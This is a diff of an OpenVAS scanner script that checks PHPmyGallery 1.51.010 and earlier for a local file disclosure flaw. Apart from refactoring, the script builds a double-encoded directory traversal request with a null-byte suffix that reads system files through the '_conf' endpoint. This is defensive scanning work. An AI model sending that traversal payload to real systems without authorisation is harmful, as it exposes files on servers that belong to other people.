@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_phpmygallery_58081.nasl 5627 2017-03-20 15:22:38Z cfi $
+# $Id: gb_phpmygallery_58081.nasl 5699 2017-03-23 14:53:33Z cfi $
 #
 # PHPmyGallery Local File Disclosure and Cross Site Scripting Vulnerabilities
 #
@@ -37,25 +37,18 @@ vulnerable application. This may aid in further attacks
 
 PHPmyGallery 1.51.010 and prior versions are vulnerable.";
 
-
-SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103668";
-
 if (description)
 {
- script_oid(SCRIPT_OID);
+ script_oid("1.3.6.1.4.1.25623.1.0.103668");
  script_bugtraq_id(58081);
- script_version ("$Revision: 5627 $");
+ script_version ("$Revision: 5699 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
-
  script_name("PHPmyGallery Local File Disclosure and Cross Site Scripting Vulnerabilities");
-
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/58081");
  script_xref(name : "URL" , value : "http://phpmygallery.kapierich.net/en/");
-
- script_tag(name:"last_modification", value:"$Date: 2017-03-20 16:22:38 +0100 (Mon, 20 Mar 2017) $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-23 15:53:33 +0100 (Thu, 23 Mar 2017) $");
  script_tag(name:"creation_date", value:"2013-02-26 12:29:14 +0100 (Tue, 26 Feb 2013)");
- script_summary("Determine if it is possible to read a local file");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
@@ -68,30 +61,25 @@ if (description)
 }
 
 include("http_func.inc");
-include("host_details.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
+include("host_details.inc");
    
-port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
+port = get_http_port( default:80 );
+if( ! can_host_php( port:port ) ) exit( 0 );
 
-if(!can_host_php(port:port))exit(0);
-
-dirs = make_list("/phpmygallery","/gallery",cgi_dirs());
 files = traversal_files();
 
-foreach dir (dirs) {
+foreach dir( make_list_unique( "/phpmygallery", "/gallery", cgi_dirs( port:port ) ) ) {
+
+  if( dir == "/" ) dir = "";
   foreach file (keys(files)) {
-
     url = dir + '/_conf/?action=delsettings&group=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F' + files[file]  + '%2500.jpg&picdir=Sample_Gallery&what=descriptions'; 
-
-    if(http_vuln_check(port:port, url:url,pattern:file)) {
-     
-      security_message(port:port);
-      exit(0);
-
+    if( http_vuln_check( port:port, url:url,pattern:file ) ) {
+      report = report_vuln_url( port:port, url:url );
+      security_message( port:port, data:report );
+      exit( 0 );
     }
   }
-}  
+}
 
-exit(0);
+exit( 99 );
